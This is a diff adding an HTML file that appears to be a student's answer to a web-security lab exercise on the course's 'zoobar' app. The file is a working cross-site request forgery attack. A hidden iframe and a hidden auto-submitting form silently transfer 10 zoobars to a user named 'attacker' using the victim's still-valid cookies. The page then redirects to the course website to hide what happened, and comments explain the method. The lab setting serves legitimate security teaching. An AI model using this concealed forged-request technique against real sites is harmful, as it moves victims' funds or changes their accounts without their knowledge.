@@ -1,0 +1,36 @@
+<!-- This works because:  -->
+<!-- There is a non-displayed iframe hidden on the page. This iframe contains the contents of exercise 7 -->
+<!-- which automatically transferred 10 zoobars to the user 'attacker' when the document was loaded -->
+<!-- via a form that POSTED to the real zoobar transfer API. When a post occured to zoobar, the browser -->
+<!-- sent its cookies along from the last time the user visited zoobar. Since the cookies were never -->
+<!-- invalidated, the login was still valid and the transfer occured. -->
+<!-- I listen for a load event on the iframe. When the iframe loads (meaning the POST to zoobar is done) -->
+<!-- I change the URL of the browser to the 6.858 website. This way the user might think the file answer-8.html -->
+<!-- is just a bookmark/shortcut to the 6.858 website. Every time he clicks on it, he transfers 10 zoobars -->
+<!-- to me, the attacker, without realizing or knowing it. -->
+<!-- The iframe is never shown so the user doesn't realize the attack occured. -->
+<!-- style="display:none" -->
+<iframe id="attackf" name="attackf" style="display:none" srcdoc=""></iframe>
+
+<div style="display:none">
+<form method='POST' name='transferform' action='http://localhost:8080/zoobar/index.cgi/transfer' target="attackf">
+<p>Send <input name='zoobars_orig' type='text' value='' size=5> zoobars</p>
+<p>to <input name=recipientold type=text value='' size=10></p>
+<input name='zoobars' type='text' value='10' size=5 style='display:none'>
+<input name=recipient type=text value='attacker' size=10 style='display:none'>
+<input type='submit' name='submission' value='Send'>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</div>
+
+
+<script>
+function ldready() {
+	// alert("changing url");
+	window.parent.location.href="http://css.csail.mit.edu/6.858/2015/";
+}
+
+document.getElementById("attackf").addEventListener("load", ldready, false);
+</script>
